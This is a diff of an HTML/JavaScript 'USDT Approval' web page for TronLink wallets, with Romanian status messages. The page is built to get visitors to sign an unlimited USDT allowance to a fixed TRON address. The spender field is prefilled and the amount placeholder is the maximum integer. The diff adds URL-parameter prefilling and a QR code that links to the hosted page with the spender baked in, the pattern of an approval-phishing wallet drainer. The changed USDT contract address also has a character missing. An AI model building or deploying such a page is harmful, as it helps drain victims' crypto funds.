@@ -3,90 +3,80 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
-  <title>USDT TRC20 Approve App</title>
+  <title>TRC20 Approve PRO</title>
 
   <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
 
   <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-      font-family: system-ui, Arial;
-    }
+    * { margin:0; padding:0; box-sizing:border-box; font-family:Arial; }
 
     body {
-      height: 100vh;
-      background: #0b1220;
-      color: white;
-      display: flex;
-      justify-content: center;
-      align-items: center;
+      height:100vh;
+      background:#0b1220;
+      display:flex;
+      justify-content:center;
+      align-items:center;
+      color:white;
     }
 
     .app {
-      width: 100%;
-      max-width: 420px;
-      padding: 20px;
+      width:100%;
+      max-width:420px;
+      padding:20px;
     }
 
     .card {
-      background: #111a2e;
-      padding: 20px;
-      border-radius: 18px;
-      box-shadow: 0 10px 30px rgba(0,0,0,0.4);
+      background:#111a2e;
+      padding:20px;
+      border-radius:16px;
     }
 
-    h2 {
-      text-align: center;
-      margin-bottom: 10px;
-    }
+    h2 { text-align:center; margin-bottom:10px; }
 
     input {
-      width: 100%;
-      padding: 12px;
-      margin-top: 10px;
-      border-radius: 10px;
-      border: none;
-      background: #1b2a4a;
-      color: white;
-      outline: none;
+      width:100%;
+      padding:12px;
+      margin-top:10px;
+      border-radius:10px;
+      border:none;
+      background:#1b2a4a;
+      color:white;
     }
 
     button {
-      width: 100%;
-      padding: 12px;
-      margin-top: 10px;
-      border-radius: 10px;
-      border: none;
-      font-weight: bold;
-      cursor: pointer;
+      width:100%;
+      padding:12px;
+      margin-top:10px;
+      border-radius:10px;
+      border:none;
+      font-weight:bold;
+      cursor:pointer;
     }
 
-    .primary { background: #3b82f6; color: white; }
-    .green { background: #22c55e; color: white; }
+    .blue { background:#3b82f6; color:white; }
+    .green { background:#22c55e; color:white; }
 
     #status {
-      margin-top: 12px;
-      font-size: 13px;
-      color: #7dd3fc;
-      white-space: pre-wrap;
-      text-align: center;
+      margin-top:12px;
+      font-size:13px;
+      color:#7dd3fc;
+      white-space:pre-wrap;
+      text-align:center;
     }
 
     #qrcode {
-      margin-top: 15px;
-      display: flex;
-      justify-content: center;
-      background: white;
-      padding: 10px;
-      border-radius: 10px;
+      margin-top:15px;
+      display:flex;
+      justify-content:center;
+      background:white;
+      padding:10px;
+      border-radius:10px;
     }
 
     .title {
-      text-align: center;
-      opacity: 0.7;
-      margin-bottom: 5px;
+      text-align:center;
+      opacity:0.6;
+      margin-bottom:5px;
     }
   </style>
 </head>
@@ -96,10 +86,10 @@
 <div class="app">
   <div class="card">
 
-    <div class="title">TRC20 APPROVE DAPP</div>
+    <div class="title">TRC20 APPROVE PRO</div>
     <h2>USDT Approval</h2>
 
-    <button class="primary" onclick="connectWallet()">Connect Wallet</button>
+    <button class="blue" onclick="connectWallet()">Connect Wallet</button>
 
     <input id="spender" placeholder="TN3ssBQjMsjsTyJkGL1hL7czsQjrjpePGu" />
     <input id="amount" placeholder="115792089237316195423570985008687907853269984665640564039457584007913129639935" />
@@ -115,11 +105,29 @@
 
 <script>
 
-const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4p8otSzgjLj6t";
 let userAddress = null;
 
 /* =========================
-   WALLET DETECT
+   PREFILL FROM QR
+========================= */
+function loadFromQR() {
+  const params = new URLSearchParams(window.location.search);
+
+  const spender = params.get("spender");
+  const amount = params.get("amount");
+
+  if (spender) {
+    document.getElementById("spender").value = spender;
+  }
+
+  if (amount) {
+    document.getElementById("amount").value = amount;
+  }
+}
+
+/* =========================
+   DETECT WALLET
 ========================= */
 function detectWallet() {
   let tries = 0;
@@ -139,7 +147,7 @@ function detectWallet() {
 
     if (tries > 20) {
       document.getElementById("status").innerText =
-        "Deschide pagina în TronLink DApp Browser.";
+        "Deschide în TronLink DApp Browser!";
       clearInterval(interval);
     }
 
@@ -147,14 +155,14 @@ function detectWallet() {
 }
 
 /* =========================
-   CONNECT WALLET
+   CONNECT
 ========================= */
 async function connectWallet() {
   try {
 
-    if (!window.tronWeb) {
+    if (!window.tronLink) {
       document.getElementById("status").innerText =
-        "TronLink nu este disponibil";
+        "TronLink NU este disponibil";
       return;
     }
 
@@ -171,13 +179,13 @@ async function connectWallet() {
 }
 
 /* =========================
-   APPROVE USDT
+   APPROVE
 ========================= */
 async function approveUSDT() {
   try {
 
     if (!userAddress) {
-      alert("Conectează wallet-ul!");
+      alert("Connect wallet first");
       return;
     }
 
@@ -188,13 +196,10 @@ async function approveUSDT() {
 
     const amountInSun = window.tronWeb.toSun(amount);
 
-    const tx = await contract.approve(
-      spender,
-      amountInSun
-    ).send();
+    const tx = await contract.approve(spender, amountInSun).send();
 
     document.getElementById("status").innerText =
-      "Approve trimis!\nTX:\n" + tx;
+      "Approve sent!\nTX:\n" + tx;
 
   } catch (e) {
     document.getElementById("status").innerText = e.message;
@@ -202,25 +207,23 @@ async function approveUSDT() {
 }
 
 /* =========================
-   QR STABIL (IMPORTANT FIX)
+   QR GENERATOR (optional)
 ========================= */
 function generateQR() {
 
-  // ✔️ DOAR link direct (FĂRĂ redirect-uri)
-  const stableURL ="https://approve-d-app-mt1q.vercel.app";
+  const url =
+    "https://approve-d-app-mt1q.vercel.app?spender=TN3ssBQjMsjsTyJkGL1hL7czsQjrjpePGu&amount=100";
 
   new QRCode(document.getElementById("qrcode"), {
-    text: stableURL,
+    text: url,
     width: 160,
-    height: 160,
-    correctLevel: QRCode.CorrectLevel.H
+    height: 160
   });
 }
 
-/* =========================
-   INIT
-========================= */
+/* INIT */
 window.addEventListener("load", () => {
+  loadFromQR();
   detectWallet();
   generateQR();
 });
